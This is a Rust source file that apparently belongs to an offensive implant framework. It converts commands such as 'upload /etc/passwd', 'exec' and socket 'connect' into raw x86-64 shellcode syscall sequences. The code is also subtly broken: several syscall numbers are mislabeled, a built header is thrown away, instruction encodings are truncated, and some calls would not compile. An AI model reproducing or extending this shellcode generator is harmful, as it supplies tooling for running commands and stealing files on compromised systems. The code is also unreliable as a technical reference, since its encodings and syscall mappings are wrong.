//! Command parser and shellcode encoder.
//! 
//! Takes high-level command strings and generates corresponding syscall sequences.

use crate::syscall_interface::{SyscallInterface, SyscallRegistry};

/// Encoded command with its shellcode bytes
#[derive(Debug)]
pub struct EncodedCommand {
    pub name: String,
    pub args: Vec<u8>,
    pub shellcode: Vec<u8>,
}

/// Command parser for generating syscall sequences
pub struct CommandEncoder {
    registry: SyscallRegistry,
}

impl CommandEncoder {
    /// Create a new encoder with the default syscall registry
    pub fn new() -> Self {
        CommandEncoder {
            registry: SyscallRegistry::new(),
        }
    }
    
    /// Parse a command string and generate shellcode
    /// Format: "command [args...]" e.g., "upload /etc/passwd" or "exec ls -la"
    pub fn encode(&self, cmd_str: &str) -> Option<EncodedCommand> {
        let parts: Vec<&str> = cmd_str.split_whitespace().collect();
        
        if parts.is_empty() || parts[0].is_empty() {
            return None;
        }
        
        let name = parts[0].to_string();
        let args: Vec<u8> = self.encode_args(&parts[1..]).unwrap_or_default();
        
        // Build syscall sequence for this command
        let shellcode = self.build_command_shellcode(name.clone(), &args);
        
        Some(EncodedCommand { name, args, shellcode })
    }
    
    /// Encode string arguments as syscall data (read/write syscalls)
    fn encode_args(&self, args: &[&str]) -> Option<Vec<u8>> {
        if args.is_empty() {
            return Some(Vec::new());
        }
        
        let mut encoded = Vec::new();
        for arg in args {
            // Encode each argument character by character using syscalls 0 (read) and 1 (write)
            for ch in arg.chars() {
                if let Ok(code) = u8::from_str_radix(&format!("{:02x}", ch as u8), 16) {
                    encoded.push(0);   // syscall read
                    encoded.push((code >> 4) as u8);     // buffer offset high byte (placeholder)
                    encoded.push(code & 0xF);         // buffer offset low byte (placeholder) 
                } else {
                    return None;
                }
            }
        }
        
        Some(encoded)
    }
    
    /// Build syscall sequence for a given command type
    fn build_command_shellcode(&self, _name: String, args: &[u8]) -> Vec<u8> {
        // Command-specific syscall sequences
        
        // Header: magic number + version
        let mut header = vec![0x43, 0x59, 0x53, 0x20]; // "CYS " (Cynosure marker)
        
        // Version byte
        header.push(1);
        
        // Command type based on name prefix
        let cmd_type = match _name.as_str() {
            "exec" | "run" => 0,    // execve syscall sequence
            "upload" | "write" => 1, // write file sequence  
            "download" | "read" => 2,// read file sequence
            "connect" | "bind" => 3, // socket connect/bind
            _ => 4,                  // unknown/generic command
        };
        
        header.push(cmd_type);
        
        // Build the actual syscall sequence(s) for this command
        
        match cmd_type {
            0 => self.build_exec_shellcode(_name.clone(), args),
            1 => self.build_upload_shellcode(args),
            2 => self.build_download_shellcode(args),
            3 => self.build_socket_shellcode(args),
            _ => self.build_generic_shellcode(args),
        }
    }
    
    /// Generate shellcode for exec commands (execve syscall)
    fn build_exec_shellcode(&self, cmd: String, args: &[u8]) -> Vec<u8> {
        // execve: 
        // - syscall 59 (NR_execveat) or indirect via fork+exit
        let mut bytes = vec![0x48];
        
        if let Some(exec_stub) = self.registry.get(59).generate(59) {
            bytes.extend_from_slice(&exec_stub);
        } else {
            // Fallback: direct execve syscall number in rax
            bytes.push(0xb8);  // mov rax, imm32
            let num = (59 & 0xFFFF) as u8;
            bytes.push(num);   // low byte
            bytes.push((59 >> 8) & 0xFF); // high byte
            
            // Push argument string(s) on stack
            for arg in args {
                if !arg.is_empty() {
                    let offset = bytes.len();
                    bytes.extend_from_slice(arg);
                    
                    // Push to stack: mov rdx, [rsp + offset]
                    bytes.push(0x48);
                    bytes.push(0x89);
                    bytes.push(0xe5);  // mov ebp, rsp (placeholder)
                }
            }
        }
        
        bytes.extend_from_slice(&[0xc3]); // ret
        bytes
    }
    
    /// Generate shellcode for upload commands (write file via openat + write)
    fn build_upload_shellcode(&self, args: &[u8]) -> Vec<u8> {
        let mut bytes = vec![0x48];
        
        // syscall 29 (NR_openat) - open file with O_WRONLY | O_CREAT
        if let Some(open_stub) = self.registry.get(29).generate(29) {
            bytes.extend_from_slice(&open_stub);
        } else {
            bytes.push(0xb8);
            bytes.push((29 & 0xFFFF) as u8);
            bytes.push(((29 >> 8) & 0xFF));
        }
        
        // syscall 1 (NR_write) - write to file descriptor
        if let Some(write_stub) = self.registry.get(1).generate(1) {
            bytes.extend_from_slice(&write_stub);
        } else {
            bytes.push(0xb8);
            bytes.push((1 & 0xFFFF) as u8);
            bytes.push(((1 >> 8) & 0xFF));
        }
        
        // syscall 3 (NR_close) - close file descriptor
        if let Some(close_stub) = self.registry.get(3).generate(3) {
            bytes.extend_from_slice(&close_stub);
        } else {
            bytes.push(0xb8);
            bytes.push((3 & 0xFFFF) as u8);
            bytes.push(((3 >> 8) & 0xFF));
        }
        
        bytes.extend_from_slice(&[0xc3]); // ret
        bytes
    }
    
    /// Generate shellcode for download commands (read file via openat + read)
    fn build_download_shellcode(&self, args: &[u8]) -> Vec<u8> {
        let mut bytes = vec![0x48];
        
        // syscall 29 (NR_openat) - open file with O_RDONLY
        if let Some(open_stub) = self.registry.get(29).generate(29) {
            bytes.extend_from_slice(&open_stub);
        } else {
            bytes.push(0xb8);
            bytes.push((29 & 0xFFFF) as u8);
            bytes.push(((29 >> 8) & 0xFF));
        }
        
        // syscall 0 (NR_read) - read from file descriptor
        if let Some(read_stub) = self.registry.get(0).generate(0) {
            bytes.extend_from_slice(&read_stub);
        } else {
            bytes.push(0xb8);
            bytes.push((0 & 0xFFFF) as u8);
            bytes.push(((0 >> 8) & 0xFF));
        }
        
        // syscall 3 (NR_close) - close file descriptor
        if let Some(close_stub) = self.registry.get(3).generate(3) {
            bytes.extend_from_slice(&close_stub);
        } else {
            bytes.push(0xb8);
            bytes.push((3 & 0xFFFF) as u8);
            bytes.push(((3 >> 8) & 0xFF));
        }
        
        bytes.extend_from_slice(&[0xc3]); // ret
        bytes
    }
    
    /// Generate shellcode for socket connect commands (socket + connect)
    fn build_socket_shellcode(&self, args: &[u8]) -> Vec<u8> {
        let mut bytes = vec![0x48];
        
        // syscall 162 (NR_socket) - create socket
        if let Some(socket_stub) = self.registry.get(162).generate(162) {
            bytes.extend_from_slice(&socket_stub);
        } else {
            bytes.push(0xb8);
            bytes.push((162 & 0xFFFF) as u8);
            bytes.push(((162 >> 8) & 0xFF));
        }
        
        // syscall 42 (NR_connect) - connect socket
        if let Some(connect_stub) = self.registry.get(42).generate(42) {
            bytes.extend_from_slice(&connect_stub);
        } else {
            bytes.push(0xb8);
            bytes.push((42 & 0xFFFF) as u8);
            bytes.push(((42 >> 8) & 0xFF));
        }
        
        // syscall 61 (NR_sendmsg) - send data
        if let Some(send_stub) = self.registry.get(61).generate(61) {
            bytes.extend_from_slice(&send_stub);
        } else {
            bytes.push(0xb8);
            bytes.push((61 & 0xFFFF) as u8);
            bytes.push(((61 >> 8) & 0xFF));
        }
        
        // syscall 3 (NR_close) - close socket
        if let Some(close_stub) = self.registry.get(3).generate(3) {
            bytes.extend_from_slice(&close_stub);
        } else {
            bytes.push(0xb8);
            bytes.push((3 & 0xFFFF) as u8);
            bytes.push(((3 >> 8) & 0xFF));
        }
        
        bytes.extend_from_slice(&[0xc3]); // ret
        bytes
    }
    
    /// Generic command shellcode (fallback for unknown commands)
    fn build_generic_shellcode(&self, args: &[u8]) -> Vec<u8> {
        let mut bytes = vec![0x48];
        
        if !args.is_empty() && let Some(first_arg) = args.get(0..6) {
            // Use first argument as syscall number placeholder
            bytes.extend_from_slice(first_arg);
        } else {
            // Unknown syscall - use NOP sled + ret
            for _ in 0..5u16 {
                bytes.push(0x90); // x86_64 nop
            }
        }
        
        bytes.extend_from_slice(&[0xc3]); // ret
        bytes
    }
}
